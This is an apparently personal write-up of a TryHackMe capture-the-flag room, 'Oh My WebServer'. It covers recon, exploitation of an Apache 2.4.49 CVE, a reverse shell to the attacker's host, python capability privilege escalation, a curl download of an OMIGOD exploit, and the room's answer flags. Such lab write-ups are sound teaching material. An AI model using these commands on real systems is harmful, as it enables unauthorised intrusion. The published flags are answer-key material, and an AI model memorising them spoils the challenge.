<p align="center">May 11, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{370}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/1c0e070e-fb6b-4b01-9d34-319c04e4bf45" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/62cf4572-71af-43ed-898e-31c0887632ce" alt="streak"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Oh My WebServer}}$$</h1>
<p align="center"><em>Can you root me?</em>.<br>
It is classified as a medium-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/ohmyweb"</a>.</p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/2f0a63a8-2483-42b8-b053-a95b3d25b10b"> </p>

<br>
<br>

<h2>Task 1 . oh-My-Webserver</h2>

<h3>Hit me!</h3>
<p>Deploy the machine attached to this task and happy hacking!</p>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 1.1. <em>What is the user flag?</em><a id='1.1'></a>
>> <code><strong>THM{eacffefe1d2aafcc15e70dc2f07f7ac1}</strong></code><br>


<br>

> 1.2. <em>What is the root flag?</em><a id='1.2'></a>
>> <code><strong>THM{7f147ef1f36da9ae29529890a1b6011f}</strong></code><br>

<br>
<br>


<h3 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h3>
<p align="center">There are have 2 ports open: <code>22/ssh/OpenSSH 8.2p1</code> and <code>80/http/Apache httpd 2.4.49</code>.</p>

```bash
:~/OhMyWebServer# nmap -sC -sV -A -T4 ohmywebserver
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
...
```

<br>
<h3 align="center">$$\textcolor{white}{\textnormal{Gobuster x http://ohmywebserver/}}$$</h3>
<p align="center">Discovered <code>/assets/</code> and <code>/cgi-bin/</code>.</p>

<br>

```bash
:~# gobuster dir -u http://ohmywebserver/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -t 100
...
===============================================================
/assets/              (Status: 200) [Size: 404]
/cgi-bin/             (Status: 403) [Size: 199]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


<br>

<h3 align="center">$$\textcolor{white}{\textnormal{Gobuster x http://ohmywebserver/cgi-bin/}}$$</h3>
<p align="center">Discovered <code>/dcode</code>.</p>

<br>

```bash
:~# gobuster dir -u http://ohmywebserver/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
...
===============================================================
Progress: 162130 / 220561 (73.51%)[ERROR] Get "http://ohmywebserver/cgi-bin/dccode": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

<h3 align="center">$$\textcolor{white}{\textnormal{Vulnerability}}$$</h3>
<p align="center">In a previous challenge I learned that <code>Apache</code> and <code>/cgi-bin/</code> is conbination that might be vulnerable.<br>
  
  - Navigated to <code>https://httpd.apache.org</code> and researched the vulnerabilities reported.<br>
  - Googled <code>"Apache"</code> <code>AND</code> <code>"/cgi/bin"</code>.<br>
  - Discovered <code>CVE-2021-41773</code>.<br>
  - Used <code>searchploit -s apache 2.4.49</code> and got <code>50383.sh</code>.<br>
  - Used the exploit.</p>

<br>


![image](https://github.com/user-attachments/assets/a0dba432-fe59-4edd-b17b-345e5c4661c2)

<br>

![image](https://github.com/user-attachments/assets/61020d46-1855-4c3c-ac1e-d21d84d7c7ba)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{Exploiting}}$$</h3>

<br>

```bash
:~/OhMyWebServer# echo http://TargetIP > Target
:~/OhMyWebServer# cat Target
http://TargetIP
:~/OhMyWebServer# ./50383.sh Target /bin/bash id
http://TargetIP
uid=1(daemon) gid=1(daemon) groups=1(daemon)
:~/OhMyWebServer# ./50383.sh Target /bin/bash pwd
http://TargetIP
/bin
```

<br>

```bash
:~/OhMyWebServer# nc -nlvp 4444
```

<br>


```bash
:~/OhMyWebServer# ./50383.sh Target /bin/bash "bash -i >& /dev/tcp/AttackIP/4444 0>&1"
```

<br>

```bash
~/OhMyWebServer# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on TargetIP 48264
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ 
```

<br>


![image](https://github.com/user-attachments/assets/d233908c-7514-4cd7-9d89-3a7106a9f0a5)

<br>

![image](https://github.com/user-attachments/assets/d1ef3841-88aa-46f6-8ffa-6359a9550f08)

<br>

```bash
daemon@4a70924bafa0:/$ find / -name docker 2>/dev/null
find / -name docker 2>/dev/null
/etc/dpkg/dpkg.cfg.d/docker
daemon@4a70924bafa0:/$ groups
groups
daemon
daemon@4a70924bafa0:/$ find / -group daemon 2>/dev/null
...
proc/225/task/225/io
/proc/225/task/225/uid_map
/proc/225/task/225/gid_map
/proc/225/task/225/projid_map
/proc/225/task/225/setgroups
/proc/225/task/225/patch_state
/proc/225/task/225/arch_status
/proc/225/fd
/proc/225/fd/0
/proc/225/fd/1
/proc/225/fd/2
/proc/225/fd/3
/proc/225/fd/4
/proc/225/fd/6
/proc/225/fd/7
/proc/225/map_files
/proc/225/map_files/55709e143000-55709e14a000
/proc/225/map_files/55709e14a000-55709e17d000
/proc/225/map_files/55709e17d000-55709e18d000
/proc/225/map_files/55709e18e000-55709e190000
/proc/225/map_files/55709e190000-55709e191000
/proc/225/map_files/7fed2d02e000-7fed2d031000
/proc/225/map_files/7fed2d031000-7fed2d038000
/proc/225/map_files/7fed2d038000-7fed2d03a000
/proc/225/map_files/7fed2d03a000-7fed2d03b000
/proc/225/map_files/7fed2d03b000-7fed
...
daemon@4a70924bafa0:/$ cd /proc
cd /proc
daemon@4a70924bafa0:/proc$ ls  
ls
1
10
11
121
122
177
211
226
8
9
93
acpi
buddyinfo
bus
cgroups
cmdline
consoles
cpuinfo
crypto
devices
diskstats
dma
driver
execdomains
fb
filesystems
fs
interrupts
iomem
ioports
irq
kallsyms
kcore
key-users
keys
kmsg
kpagecgroup
kpagecount
kpageflags
loadavg
locks
mdstat
meminfo
misc
modules
mounts
mtrr
net
pagetypeinfo
partitions
pressure
sched_debug
schedstat
scsi
self
slabinfo
softirqs
stat
swaps
sys
sysrq-trigger
sysvipc
thread-self
timer_list
tty
uptime
version
version_signature
vmallocinfo
vmstat
xen
zoneinfo
daemon@4a70924bafa0:/proc$ find / -name *.txt 2>/dev/null
find / -name *.txt 2>/dev/null
/usr/local/lib/python3.7/dist-packages/urllib3-1.26.7.dist-info/top_level.txt
/usr/local/lib/python3.7/dist-packages/urllib3-1.26.7.dist-info/LICENSE.txt
/usr/local/lib/python3.7/dist-packages/idna-3.2.dist-info/top_level.txt
/usr/local/lib/python3.7/dist-packages/requests-2.26.0.dist-info/top_level.txt
/usr/local/lib/python3.7/dist-packages/certifi-2021.5.30.dist-info/top_level.txt
/usr/local/lib/python3.7/dist-packages/charset_normalizer-2.0.6.dist-info/top_level.txt
/usr/local/lib/python3.7/dist-packages/charset_normalizer-2.0.6.dist-info/entry_points.txt
/usr/share/perl/5.28.1/unicore/SpecialCasing.txt
/usr/share/perl/5.28.1/unicore/NamedSequences.txt
/usr/share/perl/5.28.1/unicore/Blocks.txt
/usr/share/perl/5.28.1/Unicode/Collate/allkeys.txt
/usr/share/perl/5.28.1/Unicode/Collate/keys.txt
/usr/share/gnupg/help.be.txt
/usr/share/gnupg/help.da.txt
...
/usr/lib/python3/dist-packages/cryptography-2.6.1.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/cryptography-2.6.1.egg-info/top_level.txt
/usr/lib/python3/dist-packages/cryptography-2.6.1.egg-info/requires.txt
/usr/lib/python3/dist-packages/keyrings.alt-3.1.1.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/keyrings.alt-3.1.1.egg-info/top_level.txt
/usr/lib/python3/dist-packages/keyrings.alt-3.1.1.egg-info/requires.txt
/usr/lib/python3/dist-packages/keyrings.alt-3.1.1.egg-info/entry_points.txt
/usr/lib/python3/dist-packages/wheel-0.32.3.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/wheel-0.32.3.egg-info/top_level.txt
/usr/lib/python3/dist-packages/wheel-0.32.3.egg-info/requires.txt
/usr/lib/python3/dist-packages/wheel-0.32.3.egg-info/entry_points.txt
/usr/lib/python3/dist-packages/six-1.12.0.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/six-1.12.0.egg-info/top_level.txt
/usr/lib/python3/dist-packages/setuptools-40.8.0.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/setuptools-40.8.0.egg-info/top_level.txt
/usr/lib/python3/dist-packages/setuptools-40.8.0.egg-info/entry_points.txt
/usr/lib/python3/dist-packages/SecretStorage-2.3.1.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/SecretStorage-2.3.1.egg-info/top_level.txt
/usr/lib/python3/dist-packages/SecretStorage-2.3.1.egg-info/requires.txt
/usr/lib/python3/dist-packages/asn1crypto-0.24.0.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/asn1crypto-0.24.0.egg-info/top_level.txt
/usr/lib/python3/dist-packages/keyring-17.1.1.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/keyring-17.1.1.egg-info/top_level.txt
/usr/lib/python3/dist-packages/keyring-17.1.1.egg-info/requires.txt
/usr/lib/python3/dist-packages/keyring-17.1.1.egg-info/entry_points.txt
/usr/lib/python3/dist-packages/PyGObject-3.30.4.egg-info/dependency_links.txt
/usr/lib/python3/dist-packages/PyGObject-3.30.4.egg-info/top_level.txt
/usr/lib/python3/dist-packages/PyGObject-3.30.4.egg-info/requires.txt
daemon@4a70924bafa0:/proc$ cd /usr/lib/python3/dist-packages
cd /usr/lib/python3/dist-packages
daemon@4a70924bafa0:/usr/lib/python3/dist-packages$ ls
ls
Crypto
...
pyxdg-0.25.egg-info
secretstorage
setuptools

...
daemon@4a70924bafa0:/usr/lib/python3/dist-packages/secretstorage$ cat defines.py
<python3/dist-packages/secretstorage$ cat defines.py              
# SecretStorage module for Python
# Access passwords using the SecretService DBus API
# Author: Dmitry Shachnev, 2013
# License: BSD

# This file contains some common defines.

SS_PREFIX = 'org.freedesktop.Secret.'
SS_PATH = '/org/freedesktop/secrets'


DBUS_UNKNOWN_METHOD  = 'org.freedesktop.DBus.Error.UnknownMethod'
DBUS_ACCESS_DENIED   = 'org.freedesktop.DBus.Error.AccessDenied'
DBUS_SERVICE_UNKNOWN = 'org.freedesktop.DBus.Error.ServiceUnknown'
DBUS_EXEC_FAILED     = 'org.freedesktop.DBus.Error.Spawn.ExecFailed'
DBUS_NO_REPLY        = 'org.freedesktop.DBus.Error.NoReply'
DBUS_NOT_SUPPORTED   = 'org.freedesktop.DBus.Error.NotSupported'
DBUS_NO_SUCH_OBJECT  = 'org.freedesktop.Secret.Error.NoSuchObject'

ALGORITHM_PLAIN = 'plain'
ALGORITHM_DH = 'dh-ietf1024-sha256-aes128-cbc-pkcs7'
daemon@4a70924bafa0:/usr/lib/python3/dist-packages/secretstorage$

...
daemon@4a70924bafa0:/tmp$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/tmp$ 
```

<br>


![image](https://github.com/user-attachments/assets/f0e44665-85fa-4974-9fd9-7ab76cd0ed31)


<br>

```bash
daemon@4a70924bafa0:/bin$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@4a70924bafa0:/bin# ls -la /root
ls -la /root
total 28
drwx------ 1 root root   4096 Oct  8  2021 .
drwxr-xr-x 1 root root   4096 Feb 23  2022 ..
lrwxrwxrwx 1 root root      9 Oct  8  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root    570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root   4096 Oct  8  2021 .cache
-rw-r--r-- 1 root root    148 Aug 17  2015 .profile
-rw------- 1 root daemon   12 Oct  8  2021 .python_history
-rw-r--r-- 1 root root     38 Oct  8  2021 user.txt
root@4a70924bafa0:/bin# cat /root/user.txt
cat /root/user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
root@4a70924bafa0:/bin#
```

<br>

<p align="center"><code>ifconfig</code><br>
Host = <code>172.17.0.2</code></p>

<br>


```bash
root@4a70924bafa0:/bin# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
...
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
...
root@4a70924bafa0:/bin# 

```

<br>

```bash
:~/OhMyWebServer# cp /opt/static-binaries/linux/x86_64/nmap nmap
:~/OhMyWebServer# python3 -m http.server 6666
Serving HTTP on 0.0.0.0 port 6666 (http://0.0.0.0:6666/) ...
```

<br>

```bash
root@4a70924bafa0:/tmp# curl http://10.10.174.244:6666/nmap -o nmap
curl http://10.10.174.244:6666/nmap -o nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0   138M      0 --:--:-- --:--:-- --:--:--  138M
root@4a70924bafa0:/tmp# ./nmap -p- 172.17.0.1 --min-rate=800 -vvv 
...
PORT     STATE  SERVICE REASON
22/tcp   open   ssh     syn-ack ttl 64
80/tcp   open   http    syn-ack ttl 64
5985/tcp closed unknown reset ttl 64
5986/tcp open   unknown syn-ack ttl 64
...
```

<br>



```bash
:~/OhMyWebServer# git clone https://github.com/AlteredSecurity/CVE-2021-38647
Cloning into 'CVE-2021-38647'...
...
Unpacking objects: 100% (17/17), 66.57 KiB | 5.12 MiB/s, done.
:~/OhMyWebServer# :~/OhMyWebServer# python3 -m http.server 5555
Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
```

<br>

```bash
root@4a70924bafa0:/tmp# curl http://AttackIP:5555/CVE-2021-38647.py -o ex.py
<ttp://10.10.174.244:5555/CVE-2021-38647.py -o ex.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5246  100  5246    0     0  1024k      0 --:--:-- --:--:-- --:--:-- 1024k
root@4a70924bafa0:/tmp# chmod +x ex.py
chmod +x ex.py
root@4a70924bafa0:/tmp# ls
root@4a70924bafa0:/tmp# python3 ex.py -t 172.17.0.1 -c id
python3 ex.py -t 172.17.0.1 -c id
uid=0(root) gid=0(root) groups=0(root)

root@4a70924bafa0:/tmp# python3 ex.py -t 172.17.0.1 -c pwd
python3 ex.py -t 172.17.0.1 -c pwd
/var/opt/microsoft/scx/tmp

root@4a70924bafa0:/tmp# python3 ex.py -t 172.17.0.1 -c 'ls -la /root'
python3 ex.py -t 172.17.0.1 -c 'ls -la /root'
total 56
drwx------  5 root root  4096 Feb 23  2022 .
drwxr-xr-x 20 root root  4096 Sep 30  2021 ..
-rw-------  1 root root   169 Oct  8  2021 .bash_history
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root  4096 Feb 23  2022 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
-rw-------  1 root root  1024 Sep 30  2021 .rnd
drwx------  2 root root  4096 Sep 30  2021 .ssh
-rw-------  1 root root 12125 Oct  8  2021 .viminfo
-rw-r--r--  1 root root   277 Oct  8  2021 .wget-hsts
-rw-r--r--  1 root root    38 Oct  8  2021 root.txt
drwxr-xr-x  3 root root  4096 Sep 30  2021 snap

root@4a70924bafa0:/tmp# python3 ex.py -t 172.17.0.1 -c 'cat /root/root.txt'
python3 ex.py -t 172.17.0.1 -c 'cat /root/root.txt'
THM{7f147ef1f36da9ae29529890a1b6011f}

root@4a70924bafa0:/tmp# 
```

<br>
<br>


<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/e31b0da6-4e2a-460d-aeb9-8817e8c5aa15"> </p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/507ade02-6d92-4046-8843-38c3a321a74c"> </p>


<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |   Global     |   Brazil     |   Global    |   Brazil   |          | Completed |           |
| May 11, 2025      | 370      |    230ᵗʰ     |        5ᵗʰ   |   433ʳᵈ     |    7ᵗʰ     |  101,083 |       723 |   62      |

</div>




<p align="center"> Global All Time:  230ᵗʰ <br><br><img width="1000px" src="https://github.com/user-attachments/assets/6e08931c-f400-4307-a8e3-e235d5b65ecf"> </p>

<p align="center"> Brazil All Time: 5ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/58f91585-5fcd-448d-b429-786ae6f94aaa"> </p>

<p align="center"> Global monthly: 433ʳᵈ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/194b7933-1999-4d3e-9b01-156771c7341d"> </p>

<p align="center"> Brazil monthly: 7ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/0214179c-e416-4869-92db-eb7fc0499318"> </p>


<br>
<br>


<p align="center"> Weekly League [ Diamond ]:    9ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/368d0000-0923-4af6-805c-cf50aa8ce0a2"> </p>

<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/tinyb0y">tinyb0y</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p>
